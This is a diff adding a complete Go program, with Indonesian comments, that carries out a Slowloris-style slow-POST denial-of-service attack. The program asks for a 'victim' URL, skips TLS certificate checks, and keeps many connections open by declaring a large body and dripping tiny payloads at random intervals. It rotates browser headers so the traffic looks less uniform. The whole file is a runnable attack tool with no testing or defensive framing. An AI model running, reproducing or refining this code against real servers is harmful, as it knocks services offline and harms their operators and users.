@@ -1,0 +1,464 @@
+// GO HAQ 
+//
+//
+//
+package main
+
+import (
+	"bufio"
+	"crypto/tls"
+	"fmt"
+	"io"
+	"log"
+	"math/rand" // Import package math/rand
+	"net"
+	"net/url"
+	"os"
+	"runtime"
+	"strconv"
+	"strings"
+	"time"
+)
+
+var (
+	contentLength    int
+	dialWorkersCount int
+	goMaxProcs       int
+	rampUpInterval   time.Duration
+	testDuration     time.Duration
+	victimUrl        string
+	hostHeader        string
+)
+
+var (
+	sharedReadBuf  = make([]byte, 4096) // Buffer untuk nullReader (saat ini tidak digunakan secara langsung di versi baru)
+	tlsConfig = &tls.Config{
+		InsecureSkipVerify: true, // Abaikan error sertifikat TLS untuk fleksibilitas
+	}
+)
+
+// --- Variabel untuk Variasi Header dan Payload ---
+var (
+	userAgents = []string{
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
+		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:89.0) Gecko/20100101 Firefox/89.0",
+		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
+	}
+
+	acceptHeaders = []string{
+		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+		"application/signed-exchange;v=b3;q=0.9",
+		"*/*",
+	}
+
+	acceptLanguageHeaders = []string{
+		"en-US,en;q=0.5",
+		"en;q=0.3",
+		"id,en-US;q=0.7",
+	}
+
+	acceptEncodingHeaders = []string{
+		"gzip, deflate",
+		"br",
+		"identity",
+	}
+
+	payloadSizes = []int{1, 10, 50, 100, 250} // Ukuran dalam byte
+)
+
+// --- Helper Functions ---
+
+// Fungsi helper untuk membaca input string
+func readStringInput(prompt string) string {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Printf("%s: ", prompt)
+	input, _ := reader.ReadString('\n')
+	return strings.TrimSpace(input)
+}
+
+// Fungsi helper untuk membaca input int
+func readIntInput(prompt string, defaultValue int) int {
+	promptWithDefault := fmt.Sprintf("%s (default: %d)", prompt, defaultValue)
+	inputStr := readStringInput(promptWithDefault)
+	if inputStr == "" {
+		return defaultValue
+	}
+	val, err := strconv.Atoi(inputStr)
+	if err != nil {
+		log.Printf("Invalid input for '%s', using default value %d: %v\n", prompt, defaultValue, err)
+		return defaultValue
+	}
+	return val
+}
+
+// Fungsi helper untuk memformat durasi agar lebih mudah dibaca
+func formatDurationForPrompt(d time.Duration) string {
+	if d.Hours() >= 1 {
+		return fmt.Sprintf("%dm%ds", int(d.Minutes())%60, int(d.Seconds())%60)
+	}
+	return d.String()
+}
+
+// Fungsi helper untuk membaca input duration
+func readDurationInput(prompt string, defaultValue time.Duration) time.Duration {
+	defaultDurationStr := formatDurationForPrompt(defaultValue)
+	promptWithDefault := fmt.Sprintf("%s (default: %s)", prompt, defaultDurationStr)
+	inputStr := readStringInput(promptWithDefault)
+	if inputStr == "" {
+		return defaultValue
+	}
+	val, err := time.ParseDuration(inputStr)
+	if err != nil {
+		if _, ok := err.(*strconv.NumError); ok || strings.Contains(err.Error(), "missing unit") {
+			log.Printf("Invalid input for '%s'. Please include units (e.g., 's', 'm', 'h'). Using default value %s: %v\n", prompt, defaultDurationStr, err)
+		} else {
+			log.Printf("Invalid input for '%s', using default value %s: %v\n", prompt, defaultDurationStr, err)
+		}
+		return defaultValue
+	}
+	return val
+}
+
+// randomSleepInterval menghasilkan nilai sleepInterval yang dinamis dalam rentang tertentu
+func randomSleepInterval(min time.Duration, max time.Duration) time.Duration {
+	delta := max - min
+	if delta < 0 {
+		delta = 0 // Hindari durasi negatif
+	}
+	return min + time.Duration(rand.Int63n(int64(delta)))
+}
+
+// getRandomPayloadSize memilih ukuran payload acak dari list yang ditentukan
+func getRandomPayloadSize() int {
+	if len(payloadSizes) == 0 {
+		return 1 // Default jika list kosong
+	}
+	return payloadSizes[rand.Intn(len(payloadSizes))]
+}
+
+// getRandomHeaderValue memilih nilai header acak dari list yang ditentukan
+func getRandomHeaderValue(headers []string) string {
+	if len(headers) == 0 {
+		return "" // Return empty jika list header kosong
+	}
+	return headers[rand.Intn(len(headers))]
+}
+
+// Helper untuk min agar tidak perlu import math
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
+
+
+// nullReader membaca dari koneksi, mencoba mengidentifikasi dan mencatat respons error HTTP.
+func nullReader(conn io.Reader, ch chan<- int) {
+	defer func() { ch <- 1 }() // Sinyal bahwa reader selesai
+
+	reader := bufio.NewReader(conn)
+
+	// Baca baris pertama (status line)
+	statusLine, err := reader.ReadString('\n')
+	if err != nil {
+		if err != io.EOF {
+			log.Printf("[%s] Error reading status line: [%v]\n", victimUrl, err)
+		}
+		return
+	}
+
+	// Parse status line
+	parts := strings.Fields(statusLine)
+	if len(parts) < 2 {
+		log.Printf("[%s] Unexpected status line format: [%s]\n", victimUrl, statusLine)
+		return
+	}
+
+	statusCodeStr := parts[1]
+	statusCode, err := strconv.Atoi(statusCodeStr)
+	if err != nil {
+		log.Printf("[%s] Could not parse status code '%s' from status line: [%s]\n", victimUrl, statusCodeStr, statusLine)
+		return
+	}
+
+	statusText := ""
+	if len(parts) > 2 {
+		statusText = strings.Join(parts[2:], " ")
+	}
+
+	// Cek apakah ini adalah kode error HTTP yang signifikan (4xx atau 5xx)
+	isErrorResponse := (statusCode >= 400 && statusCode < 600)
+
+	// Baca header sampai menemukan baris kosong (akhir header)
+	// Baca baris kosong pertama
+	headerBytes, err := reader.ReadBytes('\n')
+	for err == nil && strings.TrimSpace(string(headerBytes)) != "" {
+		headerBytes, err = reader.ReadBytes('\n')
+	}
+	// Jika error saat membaca header (selain EOF), log saja
+	if err != nil && err != io.EOF {
+		log.Printf("[%s] Error reading headers: [%v]\n", victimUrl, err)
+	}
+
+	// Jika ini adalah respons error, coba baca body-nya
+	var bodyContent string
+	if isErrorResponse {
+		// Baca sisa data dari reader sampai EOF.
+		// Ini bisa memakan waktu.
+		bodyBytes, readErr := io.ReadAll(reader)
+		if readErr != nil && readErr != io.EOF {
+			log.Printf("[%s] Error reading response body after status %d: [%v]\n", victimUrl, statusCode, readErr)
+		}
+		bodyContent = string(bodyBytes)
+
+		log.Printf("[%s] Detected HTTP Error Response: %s %s\n", victimUrl, statusCodeStr, statusText)
+		if len(bodyContent) > 0 {
+			maxBodyLogLen := 500 // Potong body agar log tetap terbaca
+			if len(bodyContent) > maxBodyLogLen {
+				bodyContent = bodyContent[:maxBodyLogLen] + "..."
+			}
+			log.Printf("[%s] Response Body (truncated): %s\n", victimUrl, bodyContent)
+		}
+	} else {
+		// Log respons non-error jika diperlukan untuk debugging, tapi biasanya tidak relevan untuk serangan
+		log.Printf("[%s] Received non-error response: %s %s\n", victimUrl, statusCodeStr, statusText)
+		// Jika Anda ingin membaca body dari respons non-error juga:
+		// bodyBytes, readErr := io.ReadAll(reader)
+		// if readErr != nil && readErr != io.EOF {
+		// 	log.Printf("[%s] Error reading non-error response body: [%v]\n", victimUrl, readErr)
+		// }
+		// if len(bodyBytes) > 0 {
+		// 	maxBodyLogLen := 200
+		// 	if len(bodyBytes) > maxBodyLogLen {
+		// 		bodyContent = string(bodyBytes[:maxBodyLogLen]) + "..."
+		// 	} else {
+		// 		bodyContent = string(bodyBytes)
+		// 	}
+		// 	log.Printf("[%s] Non-error Response Body (truncated): %s\n", victimUrl, bodyContent)
+		// }
+	}
+
+	// Log error lain yang mungkin terjadi selama pembacaan
+	if err != nil && err != io.EOF {
+		log.Printf("[%s] Error during response reading: [%v]\n", victimUrl, err)
+	}
+}
+
+
+func main() {
+	rand.Seed(time.Now().UnixNano())
+	log.SetFlags(log.Ltime)
+
+	victimUrl = readStringInput("Victim's url")
+	if victimUrl == "" {
+		victimUrl = "http://127.0.0.1/"
+	}
+
+	hostHeader = readStringInput("Host header (leave empty for auto)")
+
+	contentLength = readIntInput("Content length in bytes", 1000000)
+	dialWorkersCount = readIntInput("Dial workers count", 10)
+
+	defaultGoMaxProcs := runtime.NumCPU()
+	goMaxProcs = readIntInput(fmt.Sprintf("GOMAXPROCS"), defaultGoMaxProcs)
+	if goMaxProcs == 0 {
+		goMaxProcs = defaultGoMaxProcs
+	}
+
+	rampUpInterval = readDurationInput("Ramp up interval between new connections", time.Second)
+
+	// Baca input untuk sleep interval, namun rentang dinamis akan diterapkan di doLoris
+	// Input ini mungkin hanya digunakan untuk panduan pengguna awal.
+	inputSleepInterval := readDurationInput("Sleep interval between subsequent packets (used for initial prompt, dynamic range applied in code)", 10*time.Second)
+	log.Printf("Note: User input for 'Sleep interval' was '%s', but dynamic range (5s-15s) is applied in the code. Edit doLoris for custom dynamic range.\n", inputSleepInterval)
+
+
+	testDuration = readDurationInput("Test duration", time.Hour)
+
+	fmt.Println("\n--- Running with parameters ---")
+	fmt.Printf("victimUrl=%s\n", victimUrl)
+	fmt.Printf("hostHeader=%s\n", hostHeader)
+	fmt.Printf("contentLength=%d\n", contentLength)
+	fmt.Printf("dialWorkersCount=%d\n", dialWorkersCount)
+	fmt.Printf("goMaxProcs=%d\n", goMaxProcs)
+	fmt.Printf("rampUpInterval=%s\n", rampUpInterval)
+	fmt.Printf("sleepInterval=dynamic (range 5s-15s)\n") // Informasikan bahwa sleep interval bersifat dinamis
+	fmt.Printf("testDuration=%s\n", formatDurationForPrompt(testDuration))
+	fmt.Println("-----------------------------")
+
+	runtime.GOMAXPROCS(goMaxProcs)
+
+	victimUri, err := url.Parse(victimUrl)
+	if err != nil {
+		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", victimUrl, err)
+	}
+	victimHostPort := victimUri.Host
+	if !strings.Contains(victimHostPort, ":") {
+		port := "80"
+		if victimUri.Scheme == "https" {
+			port = "443"
+		}
+		victimHostPort = net.JoinHostPort(victimHostPort, port)
+	}
+	host := victimUri.Host
+	if len(hostHeader) > 0 {
+		host = hostHeader
+	}
+
+	// Request header dasar yang akan ditambahkan header dinamis di doLoris
+	requestHeaderBase := fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n",
+		victimUri.RequestURI(), host, contentLength)
+
+	dialWorkersLaunchInterval := rampUpInterval / time.Duration(dialWorkersCount)
+	activeConnectionsCh := make(chan int, dialWorkersCount) // Buffer size disesuaikan
+	go activeConnectionsCounter(activeConnectionsCh)
+
+	// Launch dial workers
+	for i := 0; i < dialWorkersCount; i++ {
+		go dialWorker(activeConnectionsCh, victimHostPort, victimUri, requestHeaderBase)
+		time.Sleep(dialWorkersLaunchInterval)
+	}
+
+	// Tunggu sampai durasi tes selesai
+	time.Sleep(testDuration)
+	log.Println("Test duration finished. Shutting down.")
+	// Anda mungkin ingin menambahkan cara untuk menutup goroutine secara graceful di sini
+	// jika aplikasi dijalankan sebagai service, tapi untuk script sederhana, ini cukup.
+}
+
+// dialWorker adalah goroutine yang terus-menerus membuat koneksi baru
+func dialWorker(activeConnectionsCh chan<- int, victimHostPort string, victimUri *url.URL, requestHeaderBase string) {
+	isTls := (victimUri.Scheme == "https")
+	for {
+		time.Sleep(rampUpInterval) // Jeda antar worker memulai koneksi baru
+		conn := dialVictim(victimHostPort, isTls)
+		if conn != nil {
+			// Membuat goroutine baru untuk setiap koneksi yang berhasil untuk melakukan serangan
+			go doLoris(conn, victimUri, activeConnectionsCh, requestHeaderBase) // Kirim base header
+		}
+	}
+}
+
+// activeConnectionsCounter memantau jumlah koneksi yang aktif
+func activeConnectionsCounter(ch <-chan int) {
+	var connectionsCount int
+	for n := range ch {
+		connectionsCount += n
+		// Log jumlah koneksi hanya setiap beberapa saat agar tidak spam log
+		if connectionsCount % 50 == 0 || connectionsCount == 1 || connectionsCount < 0 { // Log saat bertambah 50, saat pertama kali, atau saat berkurang (indikasi error)
+			log.Printf("[%s] Holding %d connections\n", victimUrl, connectionsCount)
+		}
+	}
+}
+
+// dialVictim mencoba membuat koneksi TCP dan TLS ke korban
+func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
+	conn, err := net.Dial("tcp", hostPort)
+	if err != nil {
+		// log.Printf("[%s] Couldn't establish connection to [%s]: [%s]\n", victimUrl, hostPort, err) // Terlalu banyak log error koneksi
+		return nil
+	}
+	tcpConn := conn.(*net.TCPConn)
+	// Set buffer size yang kecil untuk TCP agar lebih cepat terdeteksi kebocorannya/tutupnya
+	if err = tcpConn.SetReadBuffer(128); err != nil {
+		log.Printf("[%s] Cannot shrink TCP read buffer: [%s]\n", victimUrl, err)
+		conn.Close()
+		return nil
+	}
+	if err = tcpConn.SetWriteBuffer(128); err != nil {
+		log.Printf("[%s] Cannot shrink TCP write buffer: [%s]\n", victimUrl, err)
+		conn.Close()
+		return nil
+	}
+	// Nonaktifkan lingering close untuk memastikan koneksi segera ditutup saat Close() dipanggil
+	if err = tcpConn.SetLinger(0); err != nil {
+		log.Printf("[%s] Cannot disable TCP lingering: [%s]\n", victimUrl, err)
+		conn.Close()
+		return nil
+	}
+
+	if !isTls {
+		return tcpConn
+	}
+
+	// Untuk koneksi TLS
+	tlsConn := tls.Client(conn, tlsConfig)
+	if err = tlsConn.Handshake(); err != nil {
+		conn.Close() // Tutup koneksi TCP jika TLS handshake gagal
+		// log.Printf("[%s] Couldn't establish tls connection to [%s]: [%s]\n", victimUrl, hostPort, err) // Terlalu banyak log error TLS
+		return nil
+	}
+	return tlsConn
+}
+
+// doLoris melakukan serangan Slowloris pada koneksi yang diberikan dengan header dan payload dinamis
+func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh chan<- int, requestHeaderBase string) {
+	defer conn.Close()
+
+	// Buat header yang dinamis
+	dynamicHeaders := fmt.Sprintf(
+		"User-Agent: %s\nAccept: %s\nAccept-Language: %s\nAccept-Encoding: %s\n",
+		getRandomHeaderValue(userAgents),
+		getRandomHeaderValue(acceptHeaders),
+		getRandomHeaderValue(acceptLanguageHeaders),
+		getRandomHeaderValue(acceptEncodingHeaders),
+	)
+	fullRequestHeader := requestHeaderBase + dynamicHeaders // Tidak perlu tambah \n\n di sini, karena requestHeaderBase sudah ada \n
+
+	// Kirim header dasar + header dinamis
+	if _, err := conn.Write([]byte(fullRequestHeader)); err != nil {
+		// log.Printf("[%s] Cannot write requestHeader: [%s]\n", victimUrl, fullRequestHeader) // Terlalu banyak log error
+		return
+	}
+
+	activeConnectionsCh <- 1 // Naikkan hitungan koneksi aktif
+	defer func() { activeConnectionsCh <- -1 }() // Turunkan hitungan koneksi aktif saat goroutine berakhir
+
+	readerStopCh := make(chan int, 1)
+	go nullReader(conn, readerStopCh) // Mulai reader untuk mendengarkan respons
+
+	// Rentang sleep interval dinamis (EDIT DI SINI jika ingin rentang berbeda)
+	minSleep := 1 * time.Second
+	maxSleep := 3 * time.Second
+
+	bytesSent := 0
+	payloadBuf := make([]byte, 250) // Buat buffer payload yang cukup besar di awal
+
+	for bytesSent < contentLength {
+		// Pilih ukuran payload secara acak untuk pengiriman ini
+		currentPayloadSize := getRandomPayloadSize()
+		// Pastikan ukuran payload tidak melebihi sisa byte yang perlu dikirim
+		if bytesSent + currentPayloadSize > contentLength {
+			currentPayloadSize = contentLength - bytesSent
+			if currentPayloadSize <= 0 {
+				break // Sudah selesai
+			}
+		}
+
+		// Isi payloadBuf dengan karakter 'A' sesuai ukuran yang dipilih
+		// Jika buffer kurang besar, buat buffer baru
+		if len(payloadBuf) < currentPayloadSize {
+			payloadBuf = make([]byte, currentPayloadSize)
+		}
+		for i := 0; i < currentPayloadSize; i++ {
+			payloadBuf[i] = 'A' // Isi dengan karakter
+		}
+
+		// Dapatkan jeda acak sebelum mengirim payload
+		currentSleep := randomSleepInterval(minSleep, maxSleep)
+		select {
+		case <-readerStopCh: // Jika reader menghentikan kita (misal karena EOF)
+			return
+		case <-time.After(currentSleep): // Tunggu jeda acak
+		}
+
+		// Kirim payload
+		if _, err := conn.Write(payloadBuf[:currentPayloadSize]); err != nil {
+			// log.Printf("[%s] Error writing payload (%d/%d bytes): [%s]\n", victimUrl, bytesSent, contentLength, err) // Terlalu banyak log error
+			return // Jika ada error saat menulis, hentikan goroutine ini
+		}
+		bytesSent += currentPayloadSize
+	}
+}
